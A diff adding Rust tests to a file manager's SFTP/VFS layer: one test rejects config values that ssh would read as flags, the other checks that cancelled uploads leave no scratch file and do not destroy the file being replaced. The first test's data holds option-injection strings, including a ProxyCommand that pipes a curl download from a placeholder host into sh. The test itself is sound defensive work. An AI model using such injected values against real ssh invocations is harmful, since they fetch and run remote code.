@@ -609,6 +609,31 @@ fn a_minimal_service_leaves_everything_to_ssh() {
     );
 }
 
+/// `ssh` reads its operands with `getopt`, so a config value that begins with a
+/// dash becomes a flag — and `-oProxyCommand=…` is a command line. delightfile
+/// reads yazi's `vfs.toml` too, so this file is not always one the user wrote.
+#[test]
+fn a_config_value_that_ssh_would_read_as_a_flag_is_refused() {
+    for (key, value) in [
+        ("host", "-oProxyCommand=sh -c 'curl example.invalid|sh'"),
+        ("user", "-oProxyCommand=id"),
+        ("key_file", "-oProxyCommand=id"),
+    ] {
+        let text = format!("[services.evil]\nhost = \"h\"\n{key} = \"{value}\"\n");
+        let (config, warnings) = VfsConfig::parse(&text, std::path::Path::new("vfs.toml"));
+        assert!(
+            config.service("evil").is_none(),
+            "{key}: loaded a service ssh would take options from"
+        );
+        let all = warnings
+            .iter()
+            .map(|w| w.to_string())
+            .collect::<Vec<_>>()
+            .join("\n");
+        assert!(all.contains("ssh would read as an option"), "{key}: {all}");
+    }
+}
+
 #[test]
 fn bad_lines_warn_and_the_good_ones_still_load() {
     let text = r#"
@@ -1411,12 +1436,55 @@ fn sftp_server_round_trip_everything() {
         "a half-downloaded file is worse than none"
     );
 
-    // A cancelled upload removes its partial remote file too.
+    // A cancelled upload removes its partial remote file too, and leaves no
+    // scratch file behind.
     let error = vfs
         .upload(&source, &root.join("never.bin"), &cancelled)
         .expect_err("cancelled");
     assert!(matches!(error, VfsError::Cancelled), "{error}");
     assert!(!remote.path.join("never.bin").exists());
+    assert!(
+        !std::fs::read_dir(&remote.path)
+            .unwrap()
+            .filter_map(|e| e.ok())
+            .any(|e| e.file_name().to_string_lossy().contains("df-upload")),
+        "a cancelled upload left its scratch file behind"
+    );
+
+    // And — the case that used to lose data — a cancel that lands *while the
+    // transfer is running*, over a file that was already there. Opening the
+    // destination with `TRUNC` destroyed it at byte one, so a cancel left the
+    // user with neither the old contents nor the new. A ctx that is cancelled
+    // before the call does not reach this: the worker refuses it while it is
+    // still queued, so the cancel has to come from progress.
+    struct CancelMidTransfer(Arc<crate::tasks::TaskFlags>);
+    impl crate::tasks::ProgressSink for CancelMidTransfer {
+        fn set_total(&self, _bytes: u64, _files: u64) {}
+        fn advance(&self, bytes: u64, _files: u64) {
+            if bytes > 0 {
+                self.0.cancel();
+            }
+        }
+    }
+    assert_eq!(
+        std::fs::read(remote.path.join("uploaded.bin")).unwrap(),
+        b"tiny"
+    );
+    let flags = Arc::new(crate::tasks::TaskFlags::new());
+    let mid = TaskCtx::with_sink(
+        Arc::clone(&flags),
+        Arc::new(CancelMidTransfer(Arc::clone(&flags))),
+    );
+    let big_source = local.file("big-upload.bin", &big);
+    let error = vfs
+        .upload(&big_source, &root.join("uploaded.bin"), &mid)
+        .expect_err("cancelled mid-transfer");
+    assert!(matches!(error, VfsError::Cancelled), "{error}");
+    assert_eq!(
+        std::fs::read(remote.path.join("uploaded.bin")).unwrap(),
+        b"tiny",
+        "a cancelled upload destroyed the file it was replacing"
+    );
 
     // ── Clean teardown ──────────────────────────────────────────────────
     // Dropping the Vfs joins the worker, which kills and reaps the child; a
